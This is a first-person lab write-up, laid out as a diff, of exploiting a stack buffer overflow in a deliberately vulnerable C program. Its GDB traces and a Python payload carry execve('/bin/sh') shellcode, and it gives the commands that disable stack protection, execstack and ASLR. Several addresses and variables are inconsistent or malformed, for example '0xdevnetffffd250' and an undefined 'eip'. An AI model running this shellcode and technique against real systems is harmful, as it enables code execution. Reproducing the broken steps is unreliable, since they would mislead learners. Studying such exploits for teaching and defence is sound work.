@@ -1,0 +1,214 @@
+    #include <stdio.h>
+    #include <string.h>
+
+    int func(char buff[]){
+        char buffer[64];
+        printf("Address: %p\n", (void*)&buffer);
+        strcpy(buffer, buff);
+        printf("Buffer contents copied");
+    }
+
+    int main(int argc, char **argv)
+    {
+        if (argc < 2){
+            printf("Not enough args\n");
+        }else{
+            func(argv[1]);
+        }
+    }
+
+Similar code can be found all around the internet. 
+
+Just to get our bearings straight, here's a refresher on "ret" in ASM. I found understanding "ret" helped me understand better what is going on under the hood.
+    https://c9x.me/x86/html/file_module_x86_id_280.html
+    In our program, when it "returns" from our "func" functions, the Instruction Pointer (EIP) takes the return address from the top of the stack (located in ESP) and begins executing instructions at that address.
+    By overwriting the return address and replacing it with our own address, we can crash the program, or better yet point at shellcode
+
+How to find the Return Address in the current stack frame:
+The simple way to do it, is to overrun the buffer and then debug what address is located in ESP when RET is called.
+
+Using this padding we will see the return address
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+When we pass this in to our program as an argument, we can detect where our return address is located using GDB.
+
+In GDB type "disassemble <func>" (<func> being the function name) and find where it returns.
+0x565555bc <+63>:	ret   
+
+Then in GDB, "b *0x565555bc" which sets a breakpoint at 0x565555bc.
+
+Run the program again and it will break on 0x565555bc
+'c' to continue and got this error:
+
+    Program received signal SIGSEGV, Segmentation fault.
+    => 0x54545454:	Error while running hook_stop:
+    Cannot access memory at address 0x54545454
+    0x54545454 in ?? ()
+
+It's trying to access memory address 0x54545454 which is TTTT in our padding.
+This indicates that TTTT is the return address and it can't access the memory because we don't have anything there.
+
+new padding
+
+padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
+
+
+'info registers':
+esp register
+    (gdb) info registers 
+    eax            0x66	102
+    ecx            0x1	1
+    edx            0xf7fb7890	-134514544
+    ebx            0x52525252	1381126738
+    esp            0xffffd270	0xffffd270 <-- this one right here
+    ebp            0x53535353	0x53535353
+    esi            0xf7fb6000	-134520832
+    edi            0x0	0
+    eip            0xffffd250	0xffffd250
+    eflags         0x10282	[ SF IF RF ]
+    cs             0x23	35
+    ss             0x2b	43
+    ds             0x2b	43
+    es             0x2b	43
+    fs             0x0	0
+    gs             0x63	99
+    (gdb) 
+
+esp is pointed at address 0xffffd270
+
+checking return address with 'x/8wx $esp'
+    NOTE: x/8wx stands for 'eXamines/8Words_in_heX' at the address in $esp
+
+output:
+
+    (gdb) x/8wx $esp
+    0xffffd270:	0xcccccccc	0xffffd300	0xffffd340	0x565555d1
+    0xffffd280:	0xffffd2a0	0x00000000	0x00000000	0xf7df9e81
+    (gdb)
+
+esp (0xffffd24c) has value 0x54545454 which is the return address to main
+
+need to change 0x545454 to an address we have access to
+
+See in the previous output we have 0x55555555?
+Let's have it point to that, that would be address 0xdevnetffffd250
+
+    0xffffd24c:	0x54545454	0x55555555	0x56565656	0x57575757
+                             ^^^^^^^ which is this address right here
+
+So that means 0xffffd270 should be the start of our shell code
+
+Using the struct module we can format the address as bytes like this.
+'ret' will load EIP with this address
+
+import struct
+return_address = struct.pack("I", 0xffffaa2c+10000)
+
+
+After the return address we place our shellcode
+
+nops = "\x90"*90000
+#payload =  "\xCC"*4 <-- breakpoint shellcode for testing
+payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+print padding+eip+nops+payload
+
+'''
+Now when we run this script it will replace EIP with the value "0xffffd270" pointing to our shellcode located at address "0xffffd270"
+
+But we run into a problem.
+When we hit out breakpoint and hit continue:
+    (gdb) c
+    Continuing.
+
+    Program received signal SIGSEGV, Segmentation fault.
+
+The reason for this is explained here (https://security.stackexchange.com/questions/72653/exploiting-buffer-overflow-leads-to-segfault)
+Essenaitlly, when our program was compiled, stack memory is not executable, so our program won't execute instructions found in the stack memory range
+
+We can recompile our program using the '-z execstack' arguments in gcc
+
+Now if we re-execute the program, we get exactly what we want:
+
+    Breakpoint 1, 0x565555bc in func (buff=0xcccccccc <error: Cannot access memory at address 0xcccccccc>) at hello.c:88	}
+    (gdb) c
+    Continuing.
+
+    Program received signal SIGTRAP, Trace/breakpoint trap.
+
+We hit a SIGTRAP.
+This is actually our shellcode. In our script we see this:
+
+    payload = "\xCC"*4
+
+This is shellcode for a CPU interrupt INT3.
+Essentially, this is the CPU interrupt for a Breakpoint.
+When a debugger needs to hit a breakpoint, it replaced the current instruction with an INT  3 code to pause application execution
+This is how Debuggers are able to pause execution and step through lines of code.
+
+
+Currently I can hit the INT3 ops codes in GDB, but they fail when I try to run normal:
+    /home/devnet/BufferOverflowExample/hello $(python2 payload.py) ; echo $!
+    Buffer contents: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS*
+    Segmentation fault (core dumped)
+
+When running it in normal mode, I found a post saying that it logs information to /var/log/kern.log
+    devnet@devnet-VirtualBox:~/BufferOverflowExample$ tail -n 4 /var/log/kern.log
+    Mar 27 19:00:54 devnet-VirtualBox kernel: [83918.299648] hello[14254]: segfault at ffffd13c ip 00000000ffffd13c sp 00000000fffd19b0 error 14
+    Mar 27 19:00:58 devnet-VirtualBox kernel: [83922.120747] hello[14257]: segfault at ffffd13c ip 00000000ffffd13c sp 00000000ff8fc720 error 14
+    Mar 27 19:01:01 devnet-VirtualBox kernel: [83924.858722] hello[14260]: segfault at ffffd13c ip 00000000ffffd13c sp 00000000ff8d8010 error 14
+    Mar 27 19:01:02 devnet-VirtualBox kernel: [83926.603426] hello[14263]: segfault at ffffd13c ip 00000000ffffd13c sp 00000000ffb2cbf0 error 14
+Cool, so it's logging the current EIP and ESP
+
+
+At this stage I came across this stackoverflow post
+    https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it
+
+I disabled environment variables in GDB and was finally able to reproduce  SIGSEGV, Segmentation fault. like I do outside of GDB.
+Now without env vars I still cannot get it to work outside of GDB
+
+By this point, my gcc compiler command looks like this:
+    gcc -m32 -g -o hello hello.c -fno-stack-protector -z execstack
+
+I gave myself a hint by adding in some code to print the location of the buffer on the stack
+
+Wow, what do you know - 
+The buffer changes locations constantly when run under a normal shell
+    devnet@devnet-VirtualBox:~/BufferOverflowExample$ ./hello $(python2 payload.py) 
+    Address: 0xffddf670 <-----
+    Segmentation fault (core dumped)
+    devnet@devnet-VirtualBox:~/BufferOverflowExample$ ./hello $(python2 payload.py) 
+    Address: 0xffc98db0 <-----
+    Segmentation fault (core dumped)
+    devnet@devnet-VirtualBox:~/BufferOverflowExample$ ./hello $(python2 payload.py) 
+    Address: 0xfffd1960 <-----
+    Segmentation fault (core dumped)
+    devnet@devnet-VirtualBox:~/BufferOverflowExample$ ./hello $(python2 payload.py) 
+    Address: 0xff8fc6d0 <-----
+    Segmentation fault (core dumped)
+    devnet@devnet-VirtualBox:~/BufferOverflowExample$ ./hello $(python2 payload.py) 
+    Address: 0xff8d7fc0 <-----
+    Segmentation fault (core dumped)
+    devnet@devnet-VirtualBox:~/BufferOverflowExample$ ./hello $(python2 payload.py) 
+    Address: 0xffb2cba0 <-----
+    Segmentation fault (core dumped)
+
+But when run under GDB, it does not do this: the buffer is always in the same location or someplace very close.
+
+Why is the address changing so much though?
+While digging into this problem ASLR came up at one point and I have a hunch that this is the culprit here.
+
+As a test, I'm going to try disable ASLR in linux to see if that is effecting the results.
+
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+And it worked after disabling ALSR on Linux
+    devnet@devnet-VirtualBox:~/BufferOverflowExample$ ./hello $(python2 payload.py) 
+    Address: 0xfffe7300
+    $ whoami      
+    devnet
+
+The main thing I learn with this exercise is that in order for this classic buffer overflow attack to even exist now days,
+ you have to completely fail as an engineer.
+    1. Disable Stack Protection 
+    2. Make the stack executable
+    3. Disable ASLR on the operating system
